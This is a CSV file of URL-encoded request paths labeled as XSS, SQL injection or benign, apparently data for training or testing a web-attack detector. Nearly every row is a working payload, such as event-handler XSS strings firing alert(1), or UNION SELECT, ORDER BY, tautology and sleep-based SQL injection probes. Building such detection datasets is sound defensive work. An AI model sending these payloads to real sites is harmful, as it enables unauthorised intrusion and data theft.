text,label
/v1/search?q=%3Cheader+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fheader%3E,xss
/api/v1/reviews?body=%3Caudio+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Faudio%3E,xss
/v1/orders?customer_id=%27+or+%271%C3%A2%E2%82%AC%C2%B2%3D%271&status=active,sql_injection
/api/v2/search?q=ORDER+BY+11--&key=API_KEY,sql_injection
/v1/search?q=%3Cbig+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fbig%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cu+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fu%3E,xss
/api/v1/login?username=order+by&password=pass,sql_injection
/v1/search?q=%3Ctfoot+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftfoot%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cheader+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fheader%3E,xss
/api/v1/reviews?body=%3Cpicture+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fpicture%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cimage+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fimage%3E,xss
/api/v2/items/%22%29+or+sleep%28__TIME__%29%3D%22?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cthead+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fthead%3E,xss
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28--,sql_injection
/api/v2/items/81725,benign
/v1/search?q=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cparam+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fparam%3E,xss
/v1/profile?bio=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E,xss
/api/v1/reviews?body=%3Ccolgroup+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fcolgroup%3E,xss
/api/v1/comments?text=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E,xss
/api/v1/login?username=ORDER+BY+8--&password=pass,sql_injection
/v1/profile?bio=%3Cobject+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fobject%3E,xss
/api/v1/reviews?body=%3Cisindex+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fisindex%3E,xss
/api/v1/reviews?body=%3Cdiv+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdiv%3E,xss
/api/v1/comments?text=%3Celement+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Felement%3E,xss
